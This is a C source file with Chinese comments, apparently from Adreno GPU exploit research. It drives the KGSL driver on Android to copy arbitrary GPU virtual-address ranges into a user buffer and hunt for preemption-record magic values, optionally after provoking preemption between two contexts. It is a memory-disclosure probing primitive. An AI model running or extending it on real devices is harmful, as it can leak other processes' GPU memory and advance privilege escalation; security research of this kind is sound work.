/* kgsl_vascan.c — 扫 GPU VA 空间找真实抢占记录(0xFADEBACx 魔数)
 * 依据: 未映射 VA 读取 = RAZ(读零, 不 fault), 故可安全大范围扫
 * 每批 16×64KB = 1MB, 一次提交
 * usage: kgsl_vascan <start_va_hex> <n_mb> [p]   (p = 先做抢占刺激)
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

#define SLOT 0x10000UL
#define NSLOT 16
#define DST_SZ (SLOT * NSLOT)

static int fd;
static uint64_t g_clsz;
static uint32_t *ib; static uint64_t ib_ga;
static uint8_t *dst; static uint64_t dst_ga;
static uint32_t ctx;

static void cvac(void *s0, void *e) {
    char *s = (char *)((uintptr_t)s0 & ~(g_clsz - 1));
    for (; s < (char *)e; s += g_clsz) __asm volatile("dc cvac, %0" : : "r" (s) : "memory");
    __asm volatile("dsb ish" ::: "memory");
}
static void civac(void *s0, void *e) {
    char *s = (char *)((uintptr_t)s0 & ~(g_clsz - 1));
    for (; s < (char *)e; s += g_clsz) __asm volatile("dc civac, %0" : : "r" (s) : "memory");
    __asm volatile("dsb ish" ::: "memory");
}
static double now_s(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    if (!ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req)) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int submit_on(uint32_t which, uint64_t gaddr, uint32_t size, uint32_t *ts_out) {
    struct kgsl_command_object c; struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB; c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = which; req.cmdsize = sizeof(c); req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    int r = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
    if (ts_out) *ts_out = req.timestamp;
    return r;
}
static uint32_t create_with(uint32_t flags) {
    struct kgsl_drawctxt_create req = { .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req)) return 0xFFFFFFFFu;
    return req.drawctxt_id;
}
static void wait_on(uint32_t which, uint32_t ts, uint32_t ms) {
    struct { uint32_t context_id, timestamp, timeout; } w = { which, ts, ms };
    ioctl(fd, _IOWR(0x09, 0x07, char[12]), &w);
}
static int map_buf(void **host, size_t len, uint64_t *ga) {
    void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) return 1;
    memset(p, 0, len);
    struct kgsl_map_user_mem m; memset(&m, 0, sizeof(m));
    m.len = len; m.hostptr = (unsigned long)p; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m)) return 1;
    *host = p; *ga = m.gpuaddr; return 0;
}

/* 抢占刺激: 两个不同优先级 context 提交 → 触发 SQE save → 填充记录 */
static void preempt_stimulate(void) {
    uint32_t fA = 0x1812, fB = 0x2812;
    uint32_t ctxA = create_with(fA), ctxB = create_with(fB);
    if (ctxB == 0xFFFFFFFFu) { fB = 0x3812; ctxB = create_with(fB); }
    if (ctxB == 0xFFFFFFFFu) { fB = 0x0812; ctxB = create_with(fB); }
    printf("stimulate: ctxA=0x%x(0x%x) ctxB=0x%x(0x%x)\n", ctxA, fA, ctxB, fB);
    if (ctxB == 0xFFFFFFFFu) { printf("ctxB 创建失败\n"); return; }
    uint32_t *c;
    for (int i = 0; i < 32; i++) {
        c = ib;
        for (int s = 0; s < NSLOT; s++) {
            *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
            *c++ = 0;
            *c++ = lower_32_bits(dst_ga + (uint64_t)s * SLOT); *c++ = upper_32_bits(dst_ga + (uint64_t)s * SLOT);
            *c++ = lower_32_bits(dst_ga + (uint64_t)((s + 1) % NSLOT) * SLOT);
            *c++ = upper_32_bits(dst_ga + (uint64_t)((s + 1) % NSLOT) * SLOT);
        }
        uint32_t dw = (uint32_t)(c - ib);
        cvac(ib, (char *)ib + dw * 4);
        uint32_t ts = 0;
        if (submit_on(ctxA, ib_ga, dw * 4, &ts)) { printf("  A submit fail i=%d\n", i); break; }
        if ((i & 3) == 3) {
            c = ib;
            *c++ = cp_type7_packet(CP_NOP, 1); *c++ = 0;
            cvac(ib, (char *)ib + 8);
            uint32_t ts2 = 0;
            if (!submit_on(ctxB, ib_ga, 8, &ts2)) wait_on(ctxB, ts2, 2000);
            else printf("  B submit fail i=%d\n", i);
        }
        wait_on(ctxA, ts, 2000);
    }
    printf("stimulate done\n");
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); return 1; }
    if (map_buf((void **)&ib, 0x1000, &ib_ga)) { printf("map ib fail\n"); return 1; }
    if (map_buf((void **)&dst, DST_SZ, &dst_ga)) { printf("map dst fail\n"); return 1; }
    printf("# ib_ga=0x%llx dst_ga=0x%llx (%d slots x 0x%lx)\n",
           (unsigned long long)ib_ga, (unsigned long long)dst_ga, NSLOT, SLOT);
    ctx_create();

    uint64_t start = argc > 1 ? strtoull(argv[1], NULL, 0) : 0x4000000000ULL;
    uint64_t nmb   = argc > 2 ? strtoull(argv[2], NULL, 0) : 64;

    if (argc > 3 && argv[3][0] == 'p') preempt_stimulate();

    printf("scan: 0x%llx + %llu MB\n", (unsigned long long)start, (unsigned long long)nmb);
    double t0 = now_s();
    uint64_t hits = 0;
    int density_rep = 0;
    for (uint64_t mb = 0; mb < nmb; mb++) {
        uint64_t base = start + mb * NSLOT * SLOT;
        uint32_t *c = ib;
        for (int s = 0; s < NSLOT; s++) {
            *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
            *c++ = 0;
            *c++ = lower_32_bits(dst_ga + (uint64_t)s * SLOT); *c++ = upper_32_bits(dst_ga + (uint64_t)s * SLOT);
            *c++ = lower_32_bits(base + (uint64_t)s * SLOT);    *c++ = upper_32_bits(base + (uint64_t)s * SLOT);
        }
        uint32_t dw = (uint32_t)(c - ib);
        cvac(ib, (char *)ib + dw * 4);
        uint32_t ts = 0;
        int r = submit_on(ctx, ib_ga, dw * 4, &ts);
        if (r) { ctx_recreate(); r = submit_on(ctx, ib_ga, dw * 4, &ts); }
        wait_on(ctx, ts, 3000);
        civac(dst, dst + DST_SZ);
        for (int s = 0; s < NSLOT; s++) {
            uint32_t *w = (uint32_t *)(dst + s * SLOT);
            uint64_t nz = 0;
            for (uint64_t o = 0; o < SLOT / 4; o++) if (w[o]) nz++;
            if (nz > 4 && density_rep < 80) {
                density_rep++;
                printf("  DENSITY VA 0x%llx: %llu/%llu nonzero | %08x %08x %08x %08x %08x %08x %08x %08x\n",
                       (unsigned long long)(base + (uint64_t)s * SLOT), (unsigned long long)nz,
                       (unsigned long long)(SLOT / 4), w[0], w[1], w[2], w[3], w[4], w[5], w[6], w[7]);
            }
            for (uint64_t o = 0; o < SLOT / 4; o++) {
                if ((w[o] & 0xFFFFFFF0u) == 0xFADEBAC0u) {
                    uint64_t va = base + (uint64_t)s * SLOT + o * 4;
                    printf("\n*** HIT magic=0x%08x @ VA 0x%llx (slot %d +0x%llx) ***\n",
                           w[o], (unsigned long long)va, s, (unsigned long long)(o * 4));
                    for (int k = -2; k < 8; k++) {
                        if ((int64_t)o + k < 0) continue;
                        printf("   +0x%04llx: 0x%08x\n", (unsigned long long)((o + k) * 4), w[o + k]);
                    }
                    hits++;
                    if (hits > 20) { printf("hits>20, stop\n"); return 0; }
                }
            }
        }
        if ((mb & 15) == 0)
            printf("  [%6.1fs] %llu/%llu MB  base=0x%llx hits=%llu\n",
                   now_s() - t0, (unsigned long long)mb + 1, (unsigned long long)nmb,
                   (unsigned long long)base, (unsigned long long)hits);
    }
    printf("scan done %.1fs hits=%llu alive\n", now_s() - t0, (unsigned long long)hits);
    return 0;
}
